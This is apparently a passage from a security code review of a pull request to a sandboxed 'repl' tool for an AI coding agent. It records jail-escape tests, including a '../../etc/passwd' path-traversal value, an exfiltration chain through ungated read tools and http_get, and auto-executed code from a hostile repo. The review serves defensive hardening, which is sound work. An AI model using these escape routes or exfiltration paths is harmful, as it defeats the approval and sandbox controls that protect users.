`extensions/repl-extension.ts` has **zero tests** across all 157 lines.

---

## 7. Genuinely well done

- **The dedup seam is the right one.** `runDispatchLoop` is where the duplication actually was, the
  body is a faithful extraction, and 240 lines came out. The bug is in the state plumbing, not the
  judgement — and it is a ~15-line fix.
- **`runRlm` is the better base.** It is 100 lines shorter than `RLMLoop`, better structured, and its
  remaining defects are mostly one-to-five-line fixes. Fence extraction, abort plumbing, iteration
  salvage, bounded context, and a progress callback are all real improvements.
- **Mock fidelity remains excellent.** No fake interpreter anywhere; mocking sits only at the
  `LlmClient` and tool-execute seams.
- **The filesystem jail in `builtins.ts` holds.** Absolute paths, `..`, and symlink escapes were all
  re-tested under execution and all correctly refused.
- **`http_get`'s streaming 256 KiB cap with reader cancellation** (`builtins.ts:56-93`) is correct.
- **Fail-closed approval defaults are right in all four places** — `sandbox.ts:307-309`,
  `session.ts:206`, `:255-260`, `:290`, plus `repl-extension.ts:32` for the headless case.
- **`bash` gating is sound**, and no ungated tool can reach a shell.
- **The commit message told the truth.** "375 tests pass, tsc --noEmit clean" is verifiable and
  verified — a marked improvement over PR #16/#17's unreproducible claims.

---

## 8. Explicitly refuted — including corrections to the v1 review

**Corrections to v1:**

1. **`typebox` is not a runtime failure.** Pi's loader statically aliases `typebox`,
   `typebox/compile`, `typebox/value`, and `@earendil-works/pi-coding-agent` into jiti
   (`loader.js:60-110`, `:358-366`), resolving them from **pi's own** install. `typebox@1.3.7` is in
   `package-lock.json:1903` nested under pi (which ships a shrinkwrap). The extension loads fine
   *through pi*; it is unimportable by bare node/tsx, which is why `tsc` cannot see it (H30). Pi
   being a devDependency likewise does **not** break a consumer install.
2. **H5's shift is +103, not +90** — the type-check prefix was never counted. Monty errors embed a
   line number *and a rendered source excerpt*, so the model is shown preamble source it never wrote,
   not merely a wrong integer. With no preamble the shift is still +13.
3. **H5 does not affect runtime errors.** Monty runtime errors carry no line info
   (`ZeroDivisionError: division by zero`). Only syntax and typing errors are affected.
4. **B2 is not cross-process.** `Session.dump()`/`load()` are never called by the shipped surface;
   grants die with the Pi process.
5. **B2's `save_tool` escalation is unreachable from `repl`.** `createToolStoreTools` is not
   registered (`repl.ts:95-97`). The toolstore risk is real but arrives via a hostile repo (H26).
6. **A30 (secrets in dumps) is not reachable** — `dump()` is never called on the shipped path. Latent
   only.
7. **`sandbox.test.ts:482-490`'s title is wrong in the opposite direction.** Executed: an `input`
   named `echo` **shadows** the tool (`TypeError: object is not callable`); it does not "win" for the
   tool. The test passes no inputs, so it asserts nothing either way.

**Ruled out (do not re-litigate):**

| Candidate | Verdict |
|---|---|
| Refactor drifted the resume prologue (off-by-one, ordering) | REFUTED — byte-identical apart from three removed comments |
| Refactor lost `approved` flags in the trace | REFUTED — preserved at all seven sites; `calls` is by reference |
| Refactor changed error-kind classification or suspension payload shape | REFUTED — both identical |
| Refactor deleted the abort check | REFUTED — still at `:184`; its input is frozen (B8) |
| `getRunner(ctx.cwd)` memoizes a wrong root | REFUTED — `ctx.cwd` is set once per `AgentSession` and never mutated; the factory runs per `loadExtension` |
| `sessionId` reaches a filesystem path | REFUTED — `Map` key only; `run("z=1","../../etc/passwd")` just makes an entry |
| `ctx.hasUI === false` silently allows | REFUTED — fails closed; pi's own headless default is `confirm: async () => false` |
| Missing `onApproval` treated as auto-approve | REFUTED in all four code paths |
| SUBMIT swallowed by Python `try/except` | REFUTED — `SubmitSignal` is thrown JS-side and caught without resuming; Python never observes it |
| SUBMIT called twice / SUBMIT then error | REFUTED — first call terminates; later statements never run |
| `file://` and non-http schemes in `http_get` | REFUTED — rejected at `builtins.ts:225` |
| `builtins.read_file`/`list_files` jail escape | REFUTED — absolute, `..`, symlink all blocked |
| `bash` reachable via an ungated tool | REFUTED — no ungated tool spawns a process |
| `map(echo, [...])` silently leaks the sentinel `""` | REFUTED — fails at type-check with `calls.length === 0` |
| `sandboxRunOpts` mutated across RLM iterations | REFUTED — shallow-copied, `inputs` rebuilt each time; H16 does not apply to `rlm.ts` |
| Dangling LLM promise → unhandled rejection | REFUTED — both handlers attached before return |
| `types.ts` → `registry.ts` is a runtime import cycle | REFUTED — `import type`, fully erased at emit |
| Refactor left one entry point covered only transitively | REFUTED — `sandbox.test.ts:508-675` still drives `resumeSuspended` directly |

---

## 9. Recommended sequence

**Stop-ship set — fix before anyone uses the `repl` tool.**

1. **B7 + B8** — one edit. Make `printCallback` and `onAbort` write into the same `acc` object the
   loop reads. Everything downstream is corrupted until this lands.
2. **B5/B9-adjacent** — set a default `maxDurationSecs` in `sandbox.ts` and plumb the extension's
   `_signal` through `ReplRunner` to `RunOptions`. A frozen host is the failure a well-behaved model
   trips by accident.
3. **B3** — jail the bridged read tools to `cwd`, or gate them; and gate `http_get` (or allowlist it).
   These are one registry apart, so either alone breaks the exfiltration chain.
4. **B4 before B9** — guard the three prologue resumes, *then* teach `makeOnApproval` to return
   `"suspend"`. Doing B9 first opens the wedge.
5. **H26** — do not auto-execute `.pi/code-tools` without review. At minimum: prompt once per file
   hash, and register `read_tool`/`delete_tool` so the content is inspectable.

**Then the correctness set.** H24 (one predicate), H25, H27, H28, H32, H33, H35, B2.

**Then converge the RLM stacks.** Keep `runRlm`, port `RLMLoop`'s prompt builder, tool creation, and
nesting into it, delete `rlm_loop.ts`, and update the README. Details in `actionable-items.md` A40.

**Then close the gate.** CI running `npm ci && npm run check && npm test`; `extensions/` added to the
TypeScript program with `typebox` as a devDependency; the six tests in A31/A44 that would have caught
B7, B8, B9, H24, and H12.

**Ordering constraints that still matter:**

1. **B4 before B9** (above).
2. **B2's approval model before any richer approval UI.** A dialog on top of today's caching
   semantics builds a convincing illusion of consent.
3. **B7/B8 before trusting any experiment that reads `result.stdout`** — including anyone re-running
   the experiments in this document.
